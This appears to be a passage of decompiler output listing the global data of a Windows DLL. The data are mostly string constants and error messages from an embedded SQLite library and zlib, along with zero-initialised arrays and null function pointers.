char aSeq[4] = "seq"; // weak
char aName_1[5] = "name"; // weak
char aUnique_0[7] = "unique"; // weak
char aDatabaseList[14] = "database_list"; // weak
char aSeq_0[4] = "seq"; // weak
char aName_2[5] = "name"; // weak
char aFile_0[5] = "file"; // weak
char aCollationList[15] = "collation_list"; // weak
char aSeq_1[4] = "seq"; // weak
char aName_3[5] = "name"; // weak
char aForeignKeyList[17] = "foreign_key_list"; // weak
char aId[3] = "id"; // weak
char aSeq_2[4] = "seq"; // weak
char aTable_1[6] = "table"; // weak
char aFrom[5] = "from"; // weak
char aTo[3] = "to"; // weak
char aOnUpdate[10] = "on_update"; // weak
char aOnDelete[10] = "on_delete"; // weak
char aMatch_1[6] = "match"; // weak
char aNone_0[5] = "NONE"; // weak
char aCaseSensitiveL[20] = "case_sensitive_like"; // weak
char aIntegrityCheck[16] = "integrity_check"; // weak
char aQuickCheck[12] = "quick_check"; // weak
char aIntegrityCheck_0[16] = "integrity_check"; // weak
char aRowid_5[7] = "rowid "; // weak
char aMissingFromInd[21] = " missing from index "; // weak
char aWrongOfEntries[29] = "wrong # of entries in index "; // weak
char aOk[3] = "ok"; // weak
char aEncoding[9] = "encoding"; // weak
char aUtf8[5] = "UTF8"; // weak
char aEncoding_0[9] = "encoding"; // weak
char aSchemaVersion[15] = "schema_version"; // weak
char aUserVersion[13] = "user_version"; // weak
char aFreelistCount[15] = "freelist_count"; // weak
char aMatch_0[6] = "match"; // weak
char aOutOfMemory_2[14] = "out of memory"; // weak
char aS_14[3] = "%s"; // weak
char aS_15[3] = "%s"; // weak
char aRowsUpdated[13] = "rows updated"; // weak
char aParserStackOve[22] = "parser stack overflow"; // weak
char aSetList[9] = "set list"; // weak
char aNearTSyntaxErr[24] = "near \"%T\": syntax error"; // weak
char aTooManyArgumen[34] = "too many arguments on function %T"; // weak
char aIndex_0[6] = "index"; // weak
char aIndex_1[6] = "index"; // weak
char aQualifiedTable[95] = "qualified table names are not allowed on INSERT, UPDATE, and DELETE statements within triggers"; // weak
char aTheIndexedByCl[84] = "the INDEXED BY clause is not allowed on UPDATE or DELETE statements within triggers"; // weak
char aTheNotIndexedC[85] = "the NOT INDEXED clause is not allowed on UPDATE or DELETE statements within triggers"; // weak
char aNearTSyntaxErr_0[24] = "near \"%T\": syntax error"; // weak
_UNKNOWN unk_1017F074; // weak
char aBinary_4[7] = "BINARY"; // weak
char aForeignKeyMism[21] = "foreign key mismatch"; // weak
char aForeignKeyCons_0[30] = "foreign key constraint failed"; // weak
char aForeignKeyCons_1[30] = "foreign key constraint failed"; // weak
char aOld_1[4] = "old"; // weak
char aNew_3[4] = "new"; // weak
char aOid_0[4] = "oid"; // weak
char aTableSMayNotBe_2[29] = "table %s may not be modified"; // weak
char aCannotModifySB[38] = "cannot modify %s because it is a view"; // weak
char aRowsDeleted[13] = "rows deleted"; // weak
char aNew[4] = "new"; // weak
char aOld[4] = "old"; // weak
char aNoSuchColumn[15] = "no such column"; // weak
char aAmbiguousColum[22] = "ambiguous column name"; // weak
char aSubqueriesProh[43] = "subqueries prohibited in CHECK constraints"; // weak
char aParametersProh[43] = "parameters prohibited in CHECK constraints"; // weak
char aRSByTermOutOfR[56] = "%r %s BY term out of range - should be between 1 and %d"; // weak
char aTooManyTermsIn_0[34] = "too many terms in ORDER BY clause"; // weak
char aOrder_1[6] = "ORDER"; // weak
char aROrderByTermDo[61] = "%r ORDER BY term does not match any column in the result set"; // weak
char aAGroupByClause[44] = "a GROUP BY clause is required before HAVING"; // weak
char aOrder_2[6] = "ORDER"; // weak
char aGroup[6] = "GROUP"; // weak
char aAggregateFunct[59] = "aggregate functions are not allowed in the GROUP BY clause"; // weak
char asc_1017F408[2] = " "; // weak
char aUnknownOrUnsup[44] = "unknown or unsupported join type: %T %T%s%T"; // weak
char aRightAndFullOu[55] = "RIGHT and FULL OUTER JOINs are not currently supported"; // weak
char aANaturalJoinMa[50] = "a NATURAL join may not have an ON or USING clause"; // weak
char aCannotHaveBoth[55] = "cannot have both ON and USING clauses in the same join"; // weak
char aCannotJoinUsin[64] = "cannot join using column %s - column not present in both tables"; // weak
char aOnlyASingleRes[72] = "only a single result allowed for a SELECT that is part of an expression"; // weak
char aInteger_1[8] = "INTEGER"; // weak
char aRowid_1[6] = "rowid"; // weak
char aRowid_2[6] = "rowid"; // weak
char aUnionAll[10] = "UNION ALL"; // weak
char aIntersect[10] = "INTERSECT"; // weak
char aExcept[7] = "EXCEPT"; // weak
char aUnion[6] = "UNION"; // weak
char aS_11[3] = "%s"; // weak
char aS_12[3] = "%s"; // weak
char aS_13[3] = "%s"; // weak
char aOrderByClauseS[48] = "ORDER BY clause should come after %s not before"; // weak
char aLimitClauseSho[45] = "LIMIT clause should come after %s not before"; // weak
char aSelectsToTheLe[82] = "SELECTs to the left and right of %s do not have the same number of result columns"; // weak
char aOrder[6] = "ORDER"; // weak
char aOrder_0[6] = "ORDER"; // weak
char aMin[4] = "min"; // weak
char aMax[4] = "max"; // weak
char aNoTablesSpecif[20] = "no tables specified"; // weak
char aTooManyColumns_1[31] = "too many columns in result set"; // weak
char aDistinctAggreg[51] = "DISTINCT aggregates must have exactly one argument"; // weak
char aTooManyTermsIn[34] = "too many terms in compound SELECT"; // weak
char aRowsInserted[14] = "rows inserted"; // weak
char aPrimaryKeyMust[27] = "PRIMARY KEY must be unique"; // weak
char aColumns[9] = "columns "; // weak
char aColumn[8] = "column "; // weak
char asc_1017F834[3] = ", "; // weak
char aAreNotUnique[16] = " are not unique"; // weak
char aIsNotUnique[15] = " is not unique"; // weak
char aPrimaryKeyMust_0[27] = "PRIMARY KEY must be unique"; // weak
char aTooManyAttache[37] = "too many attached databases - max %d"; // weak
char aCannotAttachDa[42] = "cannot ATTACH database within transaction"; // weak
char aDatabaseSIsAlr[30] = "database %s is already in use"; // weak
char aDatabaseIsAlre[29] = "database is already attached"; // weak
char aAttachedDataba_0[68] = "attached databases must use the same text encoding as main database"; // weak
char aOutOfMemory_1[14] = "out of memory"; // weak
char aUnableToOpenDa[28] = "unable to open database: %s"; // weak
char aNoSuchDatabase[21] = "no such database: %s"; // weak
char aCannotDetachDa[26] = "cannot detach database %s"; // weak
char aCannotDetachDa_0[42] = "cannot DETACH database within transaction"; // weak
char aDatabaseSIsLoc[22] = "database %s is locked"; // weak
char byte_1017FA18[12] = { '\x01', '\0', '\x01', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0' }; // weak
char byte_1017FA48[12] = { '\x03', '\0', '\x01', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0' }; // weak
char aSTCannotRefere[46] = "%s %T cannot reference objects in database %s"; // weak
char aTooManySqlVari[23] = "too many SQL variables"; // weak
char aRowid[8] = "_ROWID_"; // weak
char aRowid_0[6] = "ROWID"; // weak
char aOid[4] = "OID"; // weak
char aRaiseMayOnlyBe[50] = "RAISE() may only be used within a trigger-program"; // weak
char aSWS[11] = "%.*s\"%w\"%s"; // weak
char aSSW[11] = "%s%.*s\"%w\""; // weak
char aSWS_0[11] = "%.*s\"%w\"%s"; // weak
char aSqliteRenameTa[20] = "sqlite_rename_table"; // weak
char aSqliteRenameTr[22] = "sqlite_rename_trigger"; // weak
char aSqliteRenamePa[21] = "sqlite_rename_parent"; // weak
char aNameQ_1[8] = "name=%Q"; // weak
char aSOrNameQ[14] = "%s OR name=%Q"; // weak
char aTblNameQ_0[12] = "tbl_name=%Q"; // weak
char aThereIsAlready_1[59] = "there is already another table or index with this name: %s"; // weak
char aSqlite_3[8] = "sqlite_"; // weak
char aTableSMayNotBe_1[28] = "table %s may not be altered"; // weak
char aViewSMayNotBeA[27] = "view %s may not be altered"; // weak
char aUpdateSqliteMa[75] = "UPDATE sqlite_master SET sql = sqlite_rename_parent(sql, %Q, %Q) WHERE %s;"; // weak
char aSqliteTempMast_9[19] = "sqlite_temp_master"; // weak
char aSqliteMaster_9[14] = "sqlite_master"; // weak
char aUpdateQSSetSql[369] = "UPDATE %Q.%s SET sql = CASE WHEN type = 'trigger' THEN sqlite_rename_trigger(sql, %Q)ELSE sqlite_rename_table(sql, %Q) END, tbl_name = %Q, name = CASE WHEN type='table' THEN %Q WHEN name LIKE 'sqlite_autoindex%%' AND type='index' THEN 'sqlite_autoindex_' || %Q || substr(name,%d+18) ELSE name END WHERE tbl_name=%Q AND (type='table' OR type='index' OR type='trigger');"; // weak
char aSqliteSequence_0[16] = "sqlite_sequence"; // weak
char aUpdateWSqliteS[58] = "UPDATE \"%w\".sqlite_sequence set name = %Q WHERE name = %Q"; // weak
char aUpdateSqliteTe[92] = "UPDATE sqlite_temp_master SET sql = sqlite_rename_trigger(sql, %Q), tbl_name = %Q WHERE %s;"; // weak
char aCannotAddAPrim[32] = "Cannot add a PRIMARY KEY column"; // weak
char aCannotAddAUniq[27] = "Cannot add a UNIQUE column"; // weak
char aCannotAddARefe[59] = "Cannot add a REFERENCES column with non-NULL default value"; // weak
char aCannotAddANotN[53] = "Cannot add a NOT NULL column with default value NULL"; // weak
char aCannotAddAColu[46] = "Cannot add a column with non-constant default"; // weak
char aSqliteTempMast_10[19] = "sqlite_temp_master"; // weak
char aSqliteMaster_10[14] = "sqlite_master"; // weak
char aUpdateWSSetSql[109] = "UPDATE \"%w\".%s SET sql = substr(sql,1,%d) || ', ' || %Q || substr(sql,%d) WHERE type = 'table' AND name = %Q"; // weak
char aVirtualTablesM_0[34] = "virtual tables may not be altered"; // weak
char aCannotAddAColu_0[30] = "Cannot add a column to a view"; // weak
char aNow[4] = "now"; // weak
char aLocaltime[] = "localtime"; // idb
char aUnixepoch[] = "unixepoch"; // idb
char aUtc[] = "utc"; // idb
char aWeekday[] = "weekday "; // idb
char aStartOf[] = "start of "; // idb
char aMonth_0[] = "month"; // idb
char aYear_0[] = "year"; // idb
char aDay[] = "day"; // idb
char aDay_0[] = "day"; // idb
char aHour[] = "hour"; // idb
char aMinute[] = "minute"; // idb
char aSecond[] = "second"; // idb
char aMonth[] = "month"; // idb
char aYear[] = "year"; // idb
char a02d_2[5] = "%02d"; // weak
char a063f[7] = "%06.3f"; // weak
char a02d_1[5] = "%02d"; // weak
char a16g[6] = "%.16g"; // weak
char a02d_3[5] = "%02d"; // weak
char a02d_0[5] = "%02d"; // weak
char aLld_0[5] = "%lld"; // weak
char a02d[5] = "%02d"; // weak
_UNKNOWN unk_10180288; // weak
int (*off_10180388[2])() = { &sub_100739D6, &sub_10073A22 }; // weak
int (__cdecl *off_10180390)(int) = &sub_10073A61; // weak
void (__cdecl *off_10180394)(LPCRITICAL_SECTION lpCriticalSection, void *) = &stdext::threads::_Mtx_delete; // weak
char aCannotVacuumFr[40] = "cannot VACUUM from within a transaction"; // weak
char aAttachAsVacuum[24] = "ATTACH '' AS vacuum_db;"; // weak
char aPragmaVacuumDb[33] = "PRAGMA vacuum_db.synchronous=OFF"; // weak
char aBeginExclusive[17] = "BEGIN EXCLUSIVE;"; // weak
char aSelectCreateTa[136] = "SELECT 'CREATE TABLE vacuum_db.' || substr(sql,14)   FROM sqlite_master WHERE type='table' AND name!='sqlite_sequence'   AND rootpage>0"; // weak
char aSelectCreateIn[104] = "SELECT 'CREATE INDEX vacuum_db.' || substr(sql,14)  FROM sqlite_master WHERE sql LIKE 'CREATE INDEX %' "; // weak
char aSelectCreateUn[118] = "SELECT 'CREATE UNIQUE INDEX vacuum_db.' || substr(sql,21)   FROM sqlite_master WHERE sql LIKE 'CREATE UNIQUE INDEX %'"; // weak
char aSelectInsertIn[184] = "SELECT 'INSERT INTO vacuum_db.' || quote(name) || ' SELECT * FROM main.' || quote(name) || ';'FROM main.sqlite_master WHERE type = 'table' AND name!='sqlite_sequence'   AND rootpage>0"; // weak
char aSelectDeleteFr[113] = "SELECT 'DELETE FROM vacuum_db.' || quote(name) || ';' FROM vacuum_db.sqlite_master WHERE name='sqlite_sequence' "; // weak
char aSelectInsertIn_0[155] = "SELECT 'INSERT INTO vacuum_db.' || quote(name) || ' SELECT * FROM main.' || quote(name) || ';' FROM vacuum_db.sqlite_master WHERE name=='sqlite_sequence';"; // weak
char aInsertIntoVacu[184] = "INSERT INTO vacuum_db.sqlite_master   SELECT type, name, tbl_name, rootpage, sql    FROM main.sqlite_master   WHERE type='view' OR type='trigger'      OR (type='table' AND rootpage=0)"; // weak
char aTemporaryTrigg[46] = "temporary trigger may not have qualified name"; // weak
char aTrigger[8] = "trigger"; // weak
char aCannotCreateTr[41] = "cannot create triggers on virtual tables"; // weak
char aTriggerTAlread[26] = "trigger %T already exists"; // weak
char aSqlite_2[8] = "sqlite_"; // weak
char aCannotCreateTr_0[38] = "cannot create trigger on system table"; // weak
char aBefore[7] = "BEFORE"; // weak
char aAfter[6] = "AFTER"; // weak
char aTrigger_0[8] = "trigger"; // weak
char aSqliteTempMast_8[19] = "sqlite_temp_master"; // weak
char aSqliteMaster_8[14] = "sqlite_master"; // weak
char aInsertIntoQSVa_0[64] = "INSERT INTO %Q.%s VALUES('trigger',%Q,%Q,0,'CREATE TRIGGER %q')"; // weak
char aTypeTriggerAnd[29] = "type='trigger' AND name='%q'"; // weak
char aTrigger_1[8] = "trigger"; // weak
char aInterrupt[10] = "interrupt"; // weak
char aUnrecognizedTo[25] = "unrecognized token: \"%T\""; // weak
char aCreateVirtualT[24] = "CREATE VIRTUAL TABLE %T"; // weak
char aSqliteTempMast_7[19] = "sqlite_temp_master"; // weak
char aSqliteMaster_7[14] = "sqlite_master"; // weak
char aUpdateQSSetTyp_0[88] = "UPDATE %Q.%s SET type='table', name=%Q, tbl_name=%Q, rootpage=0, sql=%Q WHERE rowid=#%d"; // weak
char aNameQ_0[10] = "name='%q'"; // weak
char aHidden[7] = "hidden"; // weak
char aHidden_0[8] = " hidden"; // weak
char byte_10180B40[] = { 'a' }; // weak
char aS_19[3] = "%s"; // weak
char aS_20[3] = "%s"; // weak
_UNKNOWN unk_10180BC0; // weak
char aMemory_1[] = ":memory:"; // idb
char aJournal[9] = "-journal"; // weak
char aNoSuchView[13] = "no such view"; // weak
char aNoSuchTable[14] = "no such table"; // weak
char aSqliteTempMast_1[19] = "sqlite_temp_master"; // weak
char aSqliteMaster_1[14] = "sqlite_master"; // weak
char aCorruptDatabas[17] = "corrupt database"; // weak
char aUnknownDatabas[20] = "unknown database %T"; // weak
char aSqlite[8] = "sqlite_"; // weak
char aTemporaryTable[41] = "temporary table name must be unqualified"; // weak
char aTableTAlreadyE[24] = "table %T already exists"; // weak
char aThereIsAlready[35] = "there is already an index named %s"; // weak
char aSqliteSequence[] = "sqlite_sequence"; // idb
char aInteger_0[8] = "INTEGER"; // weak
char aAutoincrementI[56] = "AUTOINCREMENT is only allowed on an INTEGER PRIMARY KEY"; // weak
char asc_10180E3C[2] = ","; // weak
char asc_10180E40[2] = ")"; // weak
char asc_10180E44[4] = "\n  "; // weak
char asc_10180E48[5] = ",\n  "; // weak
char asc_10180E50[3] = "\n)"; // weak
char aCreateTable[14] = "CREATE TABLE "; // weak
char aTable[6] = "table"; // weak
char aTable_0[6] = "TABLE"; // weak
char aView[5] = "view"; // weak
char aView_0[5] = "VIEW"; // weak
char aSqliteTempMast_2[19] = "sqlite_temp_master"; // weak
char aSqliteMaster_2[14] = "sqlite_master"; // weak
char aUpdateQSSetTyp[87] = "UPDATE %Q.%s SET type='%s', name=%Q, tbl_name=%Q, rootpage=#%d, sql=%Q WHERE rowid=#%d"; // weak
char aCreateTableQSq[42] = "CREATE TABLE %Q.sqlite_sequence(name,seq)"; // weak
char aTblNameQ[14] = "tbl_name='%q'"; // weak
char aParametersAreN[36] = "parameters are not allowed in views"; // weak
char aView_1[5] = "view"; // weak
char aSqliteTempMast_3[19] = "sqlite_temp_master"; // weak
char aSqliteMaster_3[14] = "sqlite_master"; // weak
char aUpdateQSSetRoo[56] = "UPDATE %Q.%s SET rootpage=%d WHERE #%d AND rootpage=#%d"; // weak
char aSqlite_0[8] = "sqlite_"; // weak
char aTableSMayNotBe[28] = "table %s may not be dropped"; // weak
char aUseDropTableTo[34] = "use DROP TABLE to delete table %s"; // weak
char aUseDropViewToD[32] = "use DROP VIEW to delete view %s"; // weak
char aDeleteFromSSql[45] = "DELETE FROM %s.sqlite_sequence WHERE name=%Q"; // weak
char aSqliteTempMast_4[19] = "sqlite_temp_master"; // weak
char aSqliteMaster_4[14] = "sqlite_master"; // weak
char aDeleteFromQSWh[56] = "DELETE FROM %Q.%s WHERE tbl_name=%Q and type!='trigger'"; // weak
char aSqliteStat1[13] = "sqlite_stat1"; // weak
char aDeleteFromQSql[41] = "DELETE FROM %Q.sqlite_stat1 WHERE tbl=%Q"; // weak
char aForeignKeyOnSS[63] = "foreign key on %s should reference only one column of table %T"; // weak
char aNumberOfColumn[94] = "number of columns in foreign key does not match the number of columns in the referenced table"; // weak
char aIndexedColumns[31] = "indexed columns are not unique"; // weak
char aIndex[6] = "index"; // weak
char aSqlite_1[8] = "sqlite_"; // weak
char aAltertab[10] = "altertab_"; // weak
char aTableSMayNotBe_0[28] = "table %s may not be indexed"; // weak
char aViewsMayNotBeI[25] = "views may not be indexed"; // weak
char aVirtualTablesM[34] = "virtual tables may not be indexed"; // weak
char aThereIsAlready_0[34] = "there is already a table named %s"; // weak
char aIndexSAlreadyE[24] = "index %s already exists"; // weak
char aConflictingOnC[42] = "conflicting ON CONFLICT clauses specified"; // weak
char aUnique[8] = " UNIQUE"; // weak
char aSqliteTempMast_5[19] = "sqlite_temp_master"; // weak
char aSqliteMaster_5[14] = "sqlite_master"; // weak
char aInsertIntoQSVa[48] = "INSERT INTO %Q.%s VALUES('index',%Q,%Q,#%d,%Q);"; // weak
char aNameQ[10] = "name='%q'"; // weak
char aIndexAssociate[73] = "index associated with UNIQUE or PRIMARY KEY constraint cannot be dropped"; // weak
char aSqliteTempMast_6[19] = "sqlite_temp_master"; // weak
char aSqliteMaster_6[14] = "sqlite_master"; // weak
char aDeleteFromQSWh_0[32] = "DELETE FROM %Q.%s WHERE name=%Q"; // weak
char aSqliteStat1_0[13] = "sqlite_stat1"; // weak
char aDeleteFromQSql_0[41] = "DELETE FROM %Q.sqlite_stat1 WHERE idx=%Q"; // weak
char aOn[3] = "ON"; // weak
char aUsing[6] = "USING"; // weak
char aIntegerOverflo[17] = "integer overflow"; // weak
char aUnableToOpenAT[70] = "unable to open a temporary database file for storing temporary tables"; // weak
char aInteger[8] = "integer"; // weak
char aText[5] = "text"; // weak
char aReal[5] = "real"; // weak
char aBlob[5] = "blob"; // weak
char aNull_1[5] = "null"; // weak
char aLikeOrGlobPatt[33] = "LIKE or GLOB pattern too complex"; // weak
char aEscapeExpressi[45] = "ESCAPE expression must be a single character"; // weak
char a20100105153036[61] = "2010-01-05 15:30:36 28d0d7710761114a44a1a3a425a6883c661f06e7"; // weak
char aNull_2[5] = "NULL"; // weak
char aIntegerOverflo_0[17] = "integer overflow"; // weak
char asc_10181644[2] = ","; // weak
char aMatch[6] = "MATCH"; // weak
char aLike[5] = "like"; // weak
char aLike_0[5] = "like"; // weak
char aGlob[5] = "glob"; // weak
char aGlob_0[5] = "glob"; // weak
char aLike_1[5] = "like"; // weak
_UNKNOWN unk_10181818; // weak
_UNKNOWN unk_10181DF8; // weak
char Str2[] = ":memory:"; // idb
char asc_10181E30[4] = "@  "; // weak
char asc_10181E34[2] = "\n"; // weak
char aInvalidPageNum[23] = "invalid page number %d"; // weak
char a2ndReferenceTo[25] = "2nd reference to page %d"; // weak
char aChildPageDepth[25] = "Child page depth differs"; // weak
char aMainFreelist[16] = "Main freelist: "; // weak
char aListOfTreeRoot[21] = "List of tree roots: "; // weak
int dword_10182148 = 1; // weak
int dword_1018214C = 1; // weak
int dword_10182150 = 1; // weak
int dword_10182158 = 100; // weak
int dword_1018215C = 500; // weak
int (__cdecl *dword_10182160)(_DWORD) = NULL; // weak
int (__cdecl *dword_10182164)(_DWORD) = NULL; // weak
int (__cdecl *dword_10182168)(_DWORD) = NULL; // weak
int (__cdecl *dword_1018216C)(_DWORD) = NULL; // weak
int (__cdecl *dword_10182170)(_DWORD) = NULL; // weak
int (__cdecl *dword_10182174)(_DWORD) = NULL; // weak
int dword_1018217C = 0; // weak
int (*dword_10182180)(void) = NULL; // weak
int (__cdecl *dword_10182188)(_DWORD) = NULL; // weak
int (*dword_1018218C)(void) = NULL; // weak
int (*dword_10182190)(void) = NULL; // weak
int (__cdecl *dword_10182194)(_DWORD) = NULL; // weak
int (*dword_10182198)(void) = NULL; // weak
int dword_101821A4 = 0; // weak
int (__cdecl *dword_101821A8)(_DWORD) = NULL; // weak
int (__cdecl *dword_101821B0)(_DWORD, _DWORD) = NULL; // weak
int (__cdecl *dword_101821B4)(_DWORD, _DWORD) = NULL; // weak
int (__cdecl *dword_101821B8)(_DWORD) = NULL; // weak
int (__cdecl *dword_101821BC)(_DWORD, _DWORD, _DWORD) = NULL; // weak
int (__cdecl *dword_101821C0)(_DWORD, _DWORD, _DWORD) = NULL; // weak
int (__cdecl *dword_101821C4)(_DWORD, _DWORD, _DWORD) = NULL; // weak
int (__cdecl *dword_101821C8)(_DWORD, _DWORD) = NULL; // weak
int (__cdecl *dword_101821CC)(_DWORD) = NULL; // weak
int dword_101821E0 = 0; // weak
int dword_101821E4 = 0; // weak
int dword_101821E8 = 0; // weak
int dword_101821EC = 0; // weak
int dword_101821F0 = 0; // weak
int dword_101821F4 = 0; // weak
int dword_101821FC = 0; // weak
int dword_10182200 = 0; // weak
int dword_10182204 = 0; // weak
int dword_10182208 = 0; // weak
int dword_1018220C = 0; // weak
int dword_10182210 = 0; // weak
int dword_10182214 = 0; // weak
int dword_10182218 = 0; // weak
char aS_22[3] = "%s"; // weak
char aS_23[3] = "%s"; // weak
char aCannotOpenSave[51] = "cannot open savepoint - SQL statements in progress"; // weak
char aRollback[9] = "rollback"; // weak
char aRelease[8] = "release"; // weak
char aCannotRollback[57] = "cannot rollback transaction - SQL statements in progress"; // weak
char aCannotCommitTr[55] = "cannot commit transaction - SQL statements in progress"; // weak
char aCannotStartATr[48] = "cannot start a transaction within a transaction"; // weak
char aCannotRollback_0[43] = "cannot rollback - no transaction is active"; // weak
char aCannotCommitNo[41] = "cannot commit - no transaction is active"; // weak
char aDatabaseSchema_0[28] = "database schema has changed"; // weak
char aSqliteTempMast_0[19] = "sqlite_temp_master"; // weak
char aSqliteMaster_0[14] = "sqlite_master"; // weak
char aSelectNameRoot_0[49] = "SELECT name, rootpage, sql FROM '%q'.%s WHERE %s"; // weak
char aTooManyLevelsO[37] = "too many levels of trigger recursion"; // weak
char aStringOrBlobTo_0[23] = "string or blob too big"; // weak
char aOutOfMemory_0[14] = "out of memory"; // weak
char aS_3[3] = "%s"; // weak
char aS_4[3] = "%s"; // weak
char aForeignKeyCons[30] = "foreign key constraint failed"; // weak
char aLld[5] = "%lld"; // weak
char a15g[7] = "%!.15g"; // weak
char a92233720368547[19] = "922337203685477580"; // weak
char asc_101824FC[2] = "?"; // weak
char aInvalidRootpag[17] = "invalid rootpage"; // weak
char aSqliteTempMast[19] = "sqlite_temp_master"; // weak
char aSqliteMaster[14] = "sqlite_master"; // weak
char a1[2] = "1"; // weak
char aBinary_3[7] = "BINARY"; // weak
char aAttachedDataba[68] = "attached databases must use the same text encoding as main database"; // weak
char aUnsupportedFil[24] = "unsupported file format"; // weak
char aSelectNameRoot[40] = "SELECT name, rootpage, sql FROM '%q'.%s"; // weak
char aStatementTooLo[19] = "statement too long"; // weak
char asc_10182654[2] = "%"; // weak
char aNan[4] = "NaN"; // weak
char aInf[5] = "-Inf"; // weak
char aInf_0[5] = "+Inf"; // weak
char aInf_1[4] = "Inf"; // weak
char aNull[5] = "NULL"; // weak
char aNull_0[7] = "(NULL)"; // weak
char asc_10182680[2] = "."; // weak
char aUnableToCloseD[46] = "unable to close due to unfinalised statements"; // weak
char aUnableToCloseD_0[51] = "unable to close due to unfinished backup operation"; // weak
char aUnknownError[14] = "unknown error"; // weak
char aUnableToDelete[63] = "unable to delete/modify user-function due to active statements"; // weak
char aMemory[9] = ":memory:"; // weak
char aUnableToDelete_0[68] = "unable to delete/modify collation sequence due to active statements"; // weak
char aBinary[7] = "BINARY"; // weak
char aBinary_0[7] = "BINARY"; // weak
char aBinary_1[7] = "BINARY"; // weak
char aRtrim[6] = "RTRIM"; // weak
char aBinary_2[7] = "BINARY"; // weak
char aNocase[7] = "NOCASE"; // weak
char aMain[5] = "main"; // weak
char aTemp[5] = "temp"; // weak
char aStringOrBlobTo[23] = "string or blob too big"; // weak
char aInvalidDistanc_2[30] = "invalid distance too far back"; // weak
char aInvalidDistanc_3[22] = "invalid distance code"; // weak
char aInvalidLiteral_1[28] = "invalid literal/length code"; // weak
char byte_10182BD4 = '1'; // weak
char aIncorrectHeade[23] = "incorrect header check"; // weak
char aUnknownCompres[27] = "unknown compression method"; // weak
char aInvalidWindowS[20] = "invalid window size"; // weak
char aUnknownCompres_0[27] = "unknown compression method"; // weak
char aUnknownHeaderF[25] = "unknown header flags set"; // weak
char aHeaderCrcMisma[20] = "header crc mismatch"; // weak
char aInvalidBlockTy[19] = "invalid block type"; // weak
char aInvalidStoredB[29] = "invalid stored block lengths"; // weak
char aTooManyLengthO[36] = "too many length or distance symbols"; // weak
char aInvalidCodeLen[25] = "invalid code lengths set"; // weak
char aInvalidBitLeng_0[26] = "invalid bit length repeat"; // weak
char aInvalidBitLeng[26] = "invalid bit length repeat"; // weak
char aInvalidLiteral[28] = "invalid literal/lengths set"; // weak
char aInvalidDistanc[22] = "invalid distances set"; // weak
char aInvalidLiteral_0[28] = "invalid literal/length code"; // weak
char aInvalidDistanc_0[22] = "invalid distance code"; // weak
char aInvalidDistanc_1[30] = "invalid distance too far back"; // weak
char aIncorrectDataC[21] = "incorrect data check"; // weak
char aIncorrectLengt[23] = "incorrect length check"; // weak
int (__thiscall **off_10182DD4)(void *Block, char) = &off_10102884; // weak
DWORD dwTlsIndex = 0u; // idb
int (__thiscall **off_10182DDC)(void *Block, char) = &off_10102884; // weak
DWORD dword_10182DE0 = 0u; // idb
int (__thiscall **off_10182DE4)(void *Block, char) = &off_10103F2C; // weak
int dword_10182DE8 = 0; // weak
int dword_101831D4 = 0; // weak
int dword_10183298 = 0; // idb
int (__stdcall *dword_1018329C)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_101832A0)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_101832A4)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_101832A8)(_DWORD) = NULL; // weak
int dword_101832B0 = 0; // weak
int dword_101832B4 = 0; // weak
_DWORD dword_101832B8[2] = { 0, 0 }; // weak
int dword_101832C0 = 0; // weak
int dword_101832C4 = 0; // weak
_DWORD dword_101832C8[2] = { 0, 0 }; // weak
_DWORD dword_101832D0[2] = { 0, 0 }; // weak
_DWORD dword_101832D8[2] = { 0, 0 }; // weak
_DWORD dword_101832E0[3] = { 0, 0, 0 }; // weak
_DWORD dword_101832EC[4] = { 0, 0, 0, 0 }; // weak
_DWORD dword_101832FC[4] = { 0, 0, 0, 0 }; // weak
_DWORD dword_1018330C[4] = { 0, 0, 0, 0 }; // weak
_DWORD dword_1018331C[4] = { 0, 0, 0, 0 }; // weak
_DWORD dword_1018332C[4] = { 0, 0, 0, 0 }; // weak
_DWORD dword_1018333C[4] = { 0, 0, 0, 0 }; // weak
_UNKNOWN unk_1018334C; // weak
_DWORD dword_10183352[4] = { 0, 0, 0, 0 }; // weak
_UNKNOWN unk_10183362; // weak
_DWORD dword_10183366[4] = { 0, 0, 0, 0 }; // weak
_DWORD dword_10183376[4] = { 0, 0, 0, 0 }; // weak
_UNKNOWN unk_10183386; // weak
_DWORD dword_10183393[4] = { 0, 0, 0, 0 }; // weak
_BYTE byte_101833A3[25] = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 }; // weak
_DWORD dword_101833BC[4] = { 0, 0, 0, 0 }; // weak
_DWORD dword_101833CC[4] = { 0, 0, 0, 0 }; // weak
_UNKNOWN unk_101833DC; // weak
_DWORD dword_101833F1[4] = { 0, 0, 0, 0 }; // weak
_UNKNOWN unk_10183401; // weak
_DWORD dword_1018340E[4] = { 0, 0, 0, 0 }; // weak
_UNKNOWN unk_1018341E; // weak
_DWORD dword_10183427[4] = { 0, 0, 0, 0 }; // weak
HANDLE dword_10183438[10] = { NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL }; // weak
int dword_10183460 = 0; // weak
_UNKNOWN unk_10183464; // weak
_DWORD dword_10183468[2] = { 0, 0 }; // weak
_DWORD dword_10183470[2] = { 0, 0 }; // weak
_DWORD dword_10183478[2] = { 0, 0 }; // weak
_DWORD dword_10183480[2] = { 0, 0 }; // weak
_DWORD dword_10183488[2] = { 0, 0 }; // weak
_DWORD dword_10183490[3] = { 0, 0, 0 }; // weak
_DWORD dword_1018349C[4] = { 0, 0, 0, 0 }; // weak
_DWORD dword_101834AC[4] = { 0, 0, 0, 0 }; // weak
_DWORD dword_101834BC[4] = { 0, 0, 0, 0 }; // weak
_DWORD dword_101834CC[4] = { 0, 0, 0, 0 }; // weak
_DWORD dword_101834DC[4] = { 0, 0, 0, 0 }; // weak
_DWORD dword_101834EC[4] = { 0, 0, 0, 0 }; // weak
_UNKNOWN unk_101834FC; // weak
_DWORD dword_10183502[4] = { 0, 0, 0, 0 }; // weak
_UNKNOWN unk_10183512; // weak
_DWORD dword_10183516[4] = { 0, 0, 0, 0 }; // weak
_DWORD dword_10183526[4] = { 0, 0, 0, 0 }; // weak
